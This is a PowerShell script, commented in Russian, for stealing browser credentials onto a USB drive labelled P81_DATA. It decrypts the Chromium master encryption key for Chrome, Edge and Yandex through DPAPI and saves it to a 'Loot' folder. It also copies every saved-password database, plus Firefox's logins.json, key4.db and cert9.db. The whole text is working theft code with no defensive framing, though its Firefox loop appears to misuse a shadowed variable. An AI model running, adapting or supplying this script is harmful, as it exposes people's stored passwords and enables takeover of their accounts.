# 1. Поиск флешки P81_DATA
$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
if (!$u) { exit }
$usb = "$($u):"
$dest = "$usb\Loot_$(Get-Date -f mmss)"
mkdir $dest -Force | Out-Null

Add-Type -AssemblyName System.Security
$report = "$dest\KEYS_ALL.txt"

# 2. Список путей (добавлен твой прямой путь)
$browsers = @(
    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
    @{n="EDGE";   p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $basePath = $b.p
    if (Test-Path $basePath) {
        # Сбор Master Key
        $ls = Join-Path $basePath "Local State"
        if (Test-Path $ls) {
            try {
                $json = Get-Content $ls -Raw | ConvertFrom-Json
                $key = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($key[5..($key.Length-1)], $null, 0)
                "[$($b.n)] Key: $([Convert]::ToBase64String($dec))" >> $report
            } catch { "[$($b.n)] Error decrypting key" >> $report }
        }

        # Рекурсивный поиск Login Data (игнорируем фильтры имен папок)
        Get-ChildItem -Path $basePath -Filter "Login Data" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            $parentDir = $_.Directory.Name
            $targetName = "$($b.n)_$($parentDir)_DB.db"
            
            # Копирование через поток байтов (самый надежный метод)
            try {
                $sourceStream = New-Object System.IO.FileStream($_.FullName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
                $destStream = New-Object System.IO.FileStream("$dest\$targetName", [System.IO.FileMode]::Create)
                $sourceStream.CopyTo($destStream)
                $sourceStream.Close()
                $destStream.Close()
            } catch {
                Copy-Item $_.FullName -Destination "$dest\$targetName" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# 3. Сбор FIREFOX (с cert9.db)
$ffDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffDir) {
    Get-ChildItem $ffDir -Directory | ForEach-Object {
        $pName = $_.Name
        @("logins.json", "key4.db", "cert9.db") | ForEach-Object {
            $f = Join-Path $_.FullName $_
            if (Test-Path $f) { Copy-Item $f -Destination "$dest\FIREFOX_$($pName)_$_" -Force }
        }
    }
}

exit
